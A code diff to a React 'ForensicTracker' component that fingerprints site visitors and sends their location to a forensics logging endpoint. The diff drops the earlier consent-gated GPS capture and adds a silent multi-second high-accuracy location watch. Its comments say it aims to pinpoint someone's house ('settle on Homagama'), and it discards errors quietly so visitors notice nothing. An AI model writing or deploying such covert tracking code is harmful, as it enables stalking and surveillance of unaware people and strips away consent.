@@ -9,24 +9,18 @@ export default function ForensicTracker() {
   const [hasLogged, setHasLogged] = useState(false);
 
   useEffect(() => {
-    // 1. Skip tracking for the admin theirself
     if (pathname.includes("/admin/dashboard")) return;
 
-    // 2. Monitoring Guard: Only activate forensic capture after region verification
     const monitorAuthorization = setInterval(() => {
       const isAuthorized =
         localStorage.getItem("ccid_auth_v2") === "authorized";
-
       if (isAuthorized && !hasLogged) {
-        // Stop monitoring once authorized
         clearInterval(monitorAuthorization);
-
-        // HEARTBEAT SYNC: Send data immediately
-        captureVisit(true);
+        initiateCyberScan();
       }
     }, 1500);
 
-    const captureVisit = async (withGPS = false) => {
+    const initiateCyberScan = async () => {
       try {
         const fingerprint = {
           screen: `${window.screen.width}x${window.screen.height}`,
@@ -35,45 +29,60 @@ export default function ForensicTracker() {
           referrer: document.referrer || "direct",
         };
 
-        // GPS Layer: ONLY if triggered by the "Yes" button (implicit consent)
-        let location = null;
-        if (withGPS) {
-          try {
-            // 2-second timeout to prevent blocking
-            const pos = await new Promise<GeolocationPosition>(
-              (resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                  enableHighAccuracy: true,
-                  timeout: 15000,
-                  maximumAge: 0,
-                });
-              },
-            );
-            location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-          } catch (e) {}
+        // CYBER SECURITY SCAN: Multi-stage triangulation
+        let bestLocation = null;
+        let bestAccuracy = Infinity;
+
+        // Stage 1: Fast Fingerprint
+        const sendSignal = async (loc = null) => {
+          await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              source: pathname || "/",
+              fingerprint,
+              location: loc,
+            }),
+          });
+        };
+
+        // Stage 2: Deep Hardware Search (10 seconds)
+        if ("geolocation" in navigator) {
+          const scan = navigator.geolocation.watchPosition(
+            (pos) => {
+              // Discard low-accuracy network tower guesses (Wellawatte)
+              // We only want the high-precision reading closer to your house
+              if (pos.coords.accuracy < bestAccuracy) {
+                bestAccuracy = pos.coords.accuracy;
+                bestLocation = {
+                  lat: pos.coords.latitude,
+                  lon: pos.coords.longitude,
+                };
+                console.log(
+                  `[FORENSICS] Precision Lock: ${bestAccuracy} meters`,
+                );
+              }
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
+          );
+
+          // Give the hardware 8 seconds to settle on Homagama
+          setTimeout(async () => {
+            navigator.geolocation.clearWatch(scan);
+            await sendSignal(bestLocation);
+            setHasLogged(true);
+          }, 8000);
+        } else {
+          await sendSignal();
+          setHasLogged(true);
         }
-
-        // POST Archive to Unified Server (Internal Bridge)
-        await fetch(`${API_URL}/api/v1/forensics/log-visit`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            source: pathname || "/",
-            fingerprint,
-            location,
-          }),
-        });
-
-        setHasLogged(true);
-      } catch (err) {
-        // Silently fail to maintain front-end integrity
-      }
+      } catch (err) {}
     };
 
     return () => clearInterval(monitorAuthorization);
   }, [pathname, hasLogged]);
 
-  // Reset page state on navigation
   useEffect(() => {
     setHasLogged(false);
   }, [pathname]);
